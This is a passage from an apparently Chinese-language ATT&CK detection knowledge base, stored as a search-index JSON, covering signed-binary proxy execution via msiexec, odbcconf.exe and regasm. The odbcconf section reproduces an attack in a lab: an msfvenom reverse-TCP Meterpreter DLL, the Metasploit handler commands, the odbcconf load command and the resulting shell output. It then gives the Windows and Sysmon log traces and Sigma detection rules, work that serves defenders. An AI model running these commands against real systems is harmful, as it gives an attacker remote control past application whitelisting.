https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/ tags: - attack.defense_evasion author: Florian Roth date: 2018/02/09 modified: 2012/12/11 logsource: category: process_creation product: windows detection: selection: CommandLine: - '* msiexec*://*' condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium","title":"sigma\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_9","text":"\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-007-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec.exe%E6%89%A7%E8%A1%8CPayload/#_10","text":"MITRE-ATT&CK-T1218-007 https://attack.mitre.org/techniques/T1218/007/ \u57fa\u4e8e\u767d\u540d\u5355\u7684Payload https://blog.csdn.net/weixin_30790841/article/details/101848854","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/","text":"T1218-008-win-\u57fa\u4e8e\u767d\u540d\u5355Odbcconf.exe\u6267\u884cPayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u53ef\u4fe1\u6570\u5b57\u8bc1\u4e66\u7b7e\u7f72\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u5728Windows\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u65f6\uff0c\u53ef\u901a\u8fc7\u6570\u5b57\u7b7e\u540d\u9a8c\u8bc1\u4fdd\u62a4\u3002Windows\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u9ed8\u8ba4\u5b89\u88c5\u7684\u4e00\u4e9b\u5fae\u8f6f\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u53ef\u7528\u6765\u4ee3\u7406\u6267\u884c\u5176\u5b83\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528\u6b64\u6280\u672f\u6765\u6267\u884c\u53ef\u80fd\u7ed5\u8fc7\u5e94\u7528\u767d\u540d\u5355\u673a\u5236\u548c\u7cfb\u7edf\u7b7e\u540d\u9a8c\u8bc1\u7684\u6076\u610f\u6587\u4ef6\u3002\u8be5\u6280\u672f\u8003\u8651\u4e86\u73b0\u6709\u6280\u672f\u4e2d\u5c1a\u672a\u8003\u8651\u7684\u4ee3\u7406\u6267\u884c\u65b9\u6cd5\u3002 \u6d4b\u8bd5\u6848\u4f8b Odbcconf.exe\u662f\u5141\u8bb8\u914d\u7f6e\u5f00\u653e\u6570\u636e\u5e93\u8fde\u63a5\uff08ODBC\uff09\u9a71\u52a8\u548c\u6570\u636e\u6e90\u540d\u79f0\u7684Windows\u5de5\u5177\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u6ee5\u7528\u6b64\u5de5\u5177\u6765\u6267\u884c\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u5c31\u50cf\u5e26\u6709REGSVR\u9009\u9879\u7684Regsvr32\u4e00\u6837\u3002 odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\file.dll\"} \u8bf4\u660e\uff1aOdbcconf.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cOdbcconf\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Odbcconf\u8c03\u7528\u3002 Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\WINDOWS\\system32\\odbcconf.exe C:\\WINDOWS\\SysWOW64\\odbcconf.exe Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\odbcconf.exe C:\\Windows\\SysWOW64\\odbcconf.exe \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows 7 \u653b\u51fb\u5206\u6790 \u751f\u6210payload.dll msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=53 -f dll -o payload.dll \u6267\u884c\u76d1\u542c \u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b) msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 53 lport => 53 msf5 exploit(multi/handler) > set AutoRunScript migrate -f AutoRunScript => migrate -f msf5 exploit(multi/handler) > exploit \u9776\u673a\u6267\u884cpayload C:\\Windows\\SysWOW64\\odbcconf.exe /a {regsvr C:\\payload.dll} \u53cd\u5f39shell msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:53 [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Meterpreter session 2 opened (192.168.126.146:53 -> 192.168.126.149:49306) at 2020-04-18 20:45:29 +0800 [*] Session ID 2 (192.168.126.146:53 -> 192.168.126.149:49306) processing AutoRunScript 'migrate -f' [!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate. [!] Example: run post/windows/manage/migrate OPTION=value [...] [*] Current server process: rundll32.exe (912) [*] Spawning notepad.exe process to migrate to [+] Migrating to 3820 [+] Successfully migrated to process meterpreter > getuid Server username: 12306Br0-PC\\12306Br0 \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u65e5\u5fd7 \u4e8b\u4ef6ID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xfec \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\SysWOW64\\odbcconf.exe \u4e8b\u4ef6ID\uff1a4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x390 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\SysWOW64\\rundll32.exe sysmon\u65e5\u5fd7 \u4e8b\u4ef6ID\uff1a1 Image: C:\\Windows\\SysWOW64\\odbcconf.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: ODBC Driver Configuration Program Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: odbcconf.exe CommandLine: C:\\Windows\\SysWOW64\\odbcconf.exe /a {regsvr C:\\payload.dll} CurrentDirectory: C:\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600} LogonId: 0x6e21a TerminalSessionId: 1 IntegrityLevel: Medium Hashes: SHA1=B1C49B2159C237B1F2BCE2D40508113E39143F7B ParentProcessGuid: {bb1f7c32-f65d-5e9a-0000-0010833eef00} ParentProcessId: 3868 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" \u4e8b\u4ef6ID\uff1a1 Image: C:\\Windows\\SysWOW64\\rundll32.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: Windows host process (Rundll32) Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: RUNDLL32.EXE CommandLine: rundll32.exe CurrentDirectory: C:\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600} LogonId: 0x6e21a TerminalSessionId: 1 IntegrityLevel: Medium Hashes: SHA1=8939CF35447B22DD2C6E6F443446ACC1BF986D58 ParentProcessGuid: {bb1f7c32-f662-5e9a-0000-0010d648ef00} ParentProcessId: 4076 ParentImage: C:\\Windows\\SysWOW64\\odbcconf.exe ParentCommandLine: C:\\Windows\\SysWOW64\\odbcconf.exe /a {regsvr C:\\payload.dll} \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: Application Whitelisting Bypass via DLL Loaded by odbcconf.exe description: Detects defence evasion attempt via odbcconf.exe execution to load DLL status: experimental references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Odbcconf.yml - https://twitter.com/Hexacorn/status/1187143326673330176 author: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community date: 2019/10/25 modified: 2019/11/07 tags: - attack.defense_evasion - attack.execution - attack.t1218 logsource: category: process_creation product: windows detection: selection_1: Image|endswith: '\\odbcconf.exe' CommandLine|contains: - '-f' - '/a' - 'regsvr' selection_2: ParentImage|endswith: '\\odbcconf.exe' Image|endswith: '\\rundll32.exe' condition: selection_1 or selection_2 level: medium falsepositives: - Legitimate use of odbcconf.exe by legitimate user \u5efa\u8bae \u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1218-008 https://attack.mitre.org/techniques/T1218/008/ windows\u4e0b\u57fa\u4e8e\u767d\u540d\u5355\u83b7\u53d6shell\u7684\u65b9\u6cd5\u6574\u7406\uff08\u4e0b\uff09 http://www.safe6.cn/article/157#directory030494471069429444","title":"T1218-008-win-\u57fa\u4e8e\u767d\u540d\u5355Odbcconf.exe\u6267\u884cPayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#t1218-008-win-odbcconfexepayload","text":"","title":"T1218-008-win-\u57fa\u4e8e\u767d\u540d\u5355Odbcconf.exe\u6267\u884cPayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#attck","text":"\u53ef\u4fe1\u6570\u5b57\u8bc1\u4e66\u7b7e\u7f72\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u5728Windows\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u65f6\uff0c\u53ef\u901a\u8fc7\u6570\u5b57\u7b7e\u540d\u9a8c\u8bc1\u4fdd\u62a4\u3002Windows\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u9ed8\u8ba4\u5b89\u88c5\u7684\u4e00\u4e9b\u5fae\u8f6f\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u53ef\u7528\u6765\u4ee3\u7406\u6267\u884c\u5176\u5b83\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528\u6b64\u6280\u672f\u6765\u6267\u884c\u53ef\u80fd\u7ed5\u8fc7\u5e94\u7528\u767d\u540d\u5355\u673a\u5236\u548c\u7cfb\u7edf\u7b7e\u540d\u9a8c\u8bc1\u7684\u6076\u610f\u6587\u4ef6\u3002\u8be5\u6280\u672f\u8003\u8651\u4e86\u73b0\u6709\u6280\u672f\u4e2d\u5c1a\u672a\u8003\u8651\u7684\u4ee3\u7406\u6267\u884c\u65b9\u6cd5\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_1","text":"Odbcconf.exe\u662f\u5141\u8bb8\u914d\u7f6e\u5f00\u653e\u6570\u636e\u5e93\u8fde\u63a5\uff08ODBC\uff09\u9a71\u52a8\u548c\u6570\u636e\u6e90\u540d\u79f0\u7684Windows\u5de5\u5177\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u6ee5\u7528\u6b64\u5de5\u5177\u6765\u6267\u884c\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u5c31\u50cf\u5e26\u6709REGSVR\u9009\u9879\u7684Regsvr32\u4e00\u6837\u3002 odbcconf.exe /S /A {REGSVR \"C:\\Users\\Public\\file.dll\"} \u8bf4\u660e\uff1aOdbcconf.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cOdbcconf\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Odbcconf\u8c03\u7528\u3002 Windows 2003 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\WINDOWS\\system32\\odbcconf.exe C:\\WINDOWS\\SysWOW64\\odbcconf.exe Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\odbcconf.exe C:\\Windows\\SysWOW64\\odbcconf.exe \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows 7","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#payloaddll","text":"msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=53 -f dll -o payload.dll","title":"\u751f\u6210payload.dll"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_6","text":"\u653b\u51fb\u673a,\u6ce8\u610f\u914d\u7f6eset AutoRunScript migrate f (AutoRunScript\u662fmsf\u4e2d\u4e00\u4e2a\u5f3a\u5927\u7684\u81ea\u52a8\u5316\u7684\u540e\u6e17\u900f\u5de5\u5177\uff0c\u8fd9\u91ccmigrate\u53c2\u6570\u662f\u8fc1\u79fb\u6728\u9a6c\u5230\u5176\u4ed6\u8fdb\u7a0b) msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 53 lport => 53 msf5 exploit(multi/handler) > set AutoRunScript migrate -f AutoRunScript => migrate -f msf5 exploit(multi/handler) > exploit","title":"\u6267\u884c\u76d1\u542c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#payload","text":"C:\\Windows\\SysWOW64\\odbcconf.exe /a {regsvr C:\\payload.dll}","title":"\u9776\u673a\u6267\u884cpayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#shell","text":"msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:53 [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Meterpreter session 2 opened (192.168.126.146:53 -> 192.168.126.149:49306) at 2020-04-18 20:45:29 +0800 [*] Session ID 2 (192.168.126.146:53 -> 192.168.126.149:49306) processing AutoRunScript 'migrate -f' [!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate. [!] Example: run post/windows/manage/migrate OPTION=value [...] [*] Current server process: rundll32.exe (912) [*] Spawning notepad.exe process to migrate to [+] Migrating to 3820 [+] Successfully migrated to process meterpreter > getuid Server username: 12306Br0-PC\\12306Br0","title":"\u53cd\u5f39shell"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_7","text":"windows\u5b89\u5168\u65e5\u5fd7 \u4e8b\u4ef6ID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xfec \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\SysWOW64\\odbcconf.exe \u4e8b\u4ef6ID\uff1a4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x390 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\SysWOW64\\rundll32.exe sysmon\u65e5\u5fd7 \u4e8b\u4ef6ID\uff1a1 Image: C:\\Windows\\SysWOW64\\odbcconf.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: ODBC Driver Configuration Program Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: odbcconf.exe CommandLine: C:\\Windows\\SysWOW64\\odbcconf.exe /a {regsvr C:\\payload.dll} CurrentDirectory: C:\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600} LogonId: 0x6e21a TerminalSessionId: 1 IntegrityLevel: Medium Hashes: SHA1=B1C49B2159C237B1F2BCE2D40508113E39143F7B ParentProcessGuid: {bb1f7c32-f65d-5e9a-0000-0010833eef00} ParentProcessId: 3868 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" \u4e8b\u4ef6ID\uff1a1 Image: C:\\Windows\\SysWOW64\\rundll32.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: Windows host process (Rundll32) Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: RUNDLL32.EXE CommandLine: rundll32.exe CurrentDirectory: C:\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600} LogonId: 0x6e21a TerminalSessionId: 1 IntegrityLevel: Medium Hashes: SHA1=8939CF35447B22DD2C6E6F443446ACC1BF986D58 ParentProcessGuid: {bb1f7c32-f662-5e9a-0000-0010d648ef00} ParentProcessId: 4076 ParentImage: C:\\Windows\\SysWOW64\\odbcconf.exe ParentCommandLine: C:\\Windows\\SysWOW64\\odbcconf.exe /a {regsvr C:\\payload.dll}","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_8","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#sigma","text":"title: Application Whitelisting Bypass via DLL Loaded by odbcconf.exe description: Detects defence evasion attempt via odbcconf.exe execution to load DLL status: experimental references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Odbcconf.yml - https://twitter.com/Hexacorn/status/1187143326673330176 author: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community date: 2019/10/25 modified: 2019/11/07 tags: - attack.defense_evasion - attack.execution - attack.t1218 logsource: category: process_creation product: windows detection: selection_1: Image|endswith: '\\odbcconf.exe' CommandLine|contains: - '-f' - '/a' - 'regsvr' selection_2: ParentImage|endswith: '\\odbcconf.exe' Image|endswith: '\\rundll32.exe' condition: selection_1 or selection_2 level: medium falsepositives: - Legitimate use of odbcconf.exe by legitimate user","title":"sigma\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_9","text":"\u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-008-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf.exe%E6%89%A7%E8%A1%8CPayload/#_10","text":"MITRE-ATT&CK-T1218-008 https://attack.mitre.org/techniques/T1218/008/ windows\u4e0b\u57fa\u4e8e\u767d\u540d\u5355\u83b7\u53d6shell\u7684\u65b9\u6cd5\u6574\u7406\uff08\u4e0b\uff09 http://www.safe6.cn/article/157#directory030494471069429444","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-009-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload/","text":"T11218-009-win-\u57fa\u4e8e\u767d\u540d\u5355Regasm.exe\u6267\u884cpayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 Windows\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8fRegsvcs\u548cRegasm\u7528\u4e8e\u6ce8\u518c.NET COM\uff08\u7ec4\u4ef6\u5bf9\u8c61\u6a21\u578b\uff09\u7a0b\u5e8f\u96c6\u3002\u4e24\u8005\u90fd\u662f\u5fae\u8f6f\u6570\u5b57\u7b7e\u540d\u7684\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528Regsvcs\u548cRegasm\u901a\u8fc7\u53d7\u4fe1\u4efb\u7684Windows\u5b9e\u7528\u7a0b\u5e8f\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\u3002\u8fd9\u4e24\u4e2a\u5b9e\u7528\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u7684\u5c5e\u6027\uff0c[ComRegisterFunction]\u6216[ComUnregisterFunction]\uff0c\u6765\u6307\u5b9a\u5e94\u5728\u6ce8\u518c\u6216\u6ce8\u9500\u4e4b\u524d\u5206\u522b\u8fd0\u884c\u7684\u4ee3\u7801\uff0c\u4ece\u800c\u7ed5\u8fc7\u8fdb\u7a0b\u767d\u540d\u5355\u3002 \u5373\u4f7f\u8fdb\u7a0b\u5728\u6ca1\u6709\u8db3\u591f\u6743\u9650\u7684\u60c5\u51b5\u4e0b\u8fd0\u884c\u5e76\u4e14\u6267\u884c\u5931\u8d25\uff0c\u4e5f\u5c06\u6267\u884c\u5177\u6709\u6ce8\u518c\u548c\u6ce8\u9500\u5c5e\u6027\u7684\u4ee3\u7801\u3002 \u6d4b\u8bd5\u6848\u4f8b Regasm \u4e3a\u7a0b\u5e8f\u96c6\u6ce8\u518c\u5de5\u5177\uff0c\u8bfb\u53d6\u7a0b\u5e8f\u96c6\u4e2d\u7684\u5143\u6570\u636e\uff0c\u5e76\u5c06\u6240\u9700\u7684\u9879\u6dfb\u52a0\u5230\u6ce8\u518c\u8868\u4e2d\u3002RegAsm.exe\u662fMicrosoft Corporation\u5f00\u53d1\u7684\u5408\u6cd5\u6587\u4ef6\u8fdb\u7a0b\u3002\u5b83\u4e0eMicrosoft.NET Assembly Registration Utility\u76f8\u5173\u8054\u3002 \u8bf4\u660e\uff1aRegasm.exe\u6240\u5728\u8def\u5f84\u6ca1\u6709\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cREGASM\u547d\u4ee4\u65e0\u6cd5\u8bc6\u522b\u3002 \u5177\u4f53\u53c2\u8003\u5fae\u8f6f\u5b98\u65b9\u6587\u6863\uff1a https://docs.microsoft.com/en-us/dotnet/framework/tools/regasm-exe-assembly-registration-tool \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a 